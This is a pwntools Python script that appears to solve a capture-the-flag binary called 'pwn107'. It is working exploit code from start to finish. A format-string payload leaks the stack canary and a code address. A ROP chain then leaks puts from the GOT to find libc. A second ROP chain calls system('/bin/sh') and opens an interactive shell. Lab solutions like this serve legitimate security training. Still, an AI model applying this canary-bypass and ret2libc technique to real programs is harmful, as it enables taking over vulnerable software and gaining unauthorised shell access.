#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from pwn import p64, u64

exe = context.binary = ELF(args.EXE or "../Tasks/pwn107.pwn107")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# -- Exploit goes here --

io = start()

elf = ELF("../Tasks/pwn107.pwn107")
rop = ROP("../Tasks/pwn107.pwn107")
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io.recvuntil(b"streak?")

# ====================================================================================

payload = b"%13$p.%41$p"
io.sendline(payload)

io.recvuntil(b"streak: ")
leaks = io.recvline().strip()

canary = int(leaks.split(b".")[0], 16)
start = int(leaks.split(b".")[1], 16)

print(
    "Value of canary is       : ",
    hex(canary),
    "\nAddress of start is      : ",
    hex(start),
)

binary_base_addr = start - elf.symbols["_start"]
print("Binary base address is   : ", hex(binary_base_addr))

# ====================================================================================

payload = b"A" * 24
payload += p64(canary)
payload += b"B" * 8
payload += p64(binary_base_addr + rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(binary_base_addr + elf.got["puts"])
payload += p64(binary_base_addr + elf.symbols["puts"])
payload += p64(binary_base_addr + elf.symbols["main"])

io.sendline(payload)
io.recvlines(5)

puts_addr = u64(io.recvline().strip().ljust(8, b"\x00"))
libc_base_addr = puts_addr - libc_elf.symbols["puts"]
print(
    "Puts absolute address is : ",
    hex(puts_addr),
    "\nLibc base address is     : ",
    hex(libc_base_addr),
)
io.recvuntil(b"streak?")
io.sendline(b"AAA")
io.recvlines(7)
# ====================================================================================

payload = b"A" * 24
payload += p64(canary)
payload += b"B" * 8
payload += p64(binary_base_addr + rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(libc_base_addr + next(libc_elf.search(b"/bin/sh")))
payload += p64(binary_base_addr + rop.find_gadget(["ret"]).address)
payload += p64(libc_base_addr + libc_elf.symbols["system"])
payload += p64(libc_base_addr + libc_elf.symbols["exit"])

io.sendline(payload)
# ====================================================================================

io.interactive()
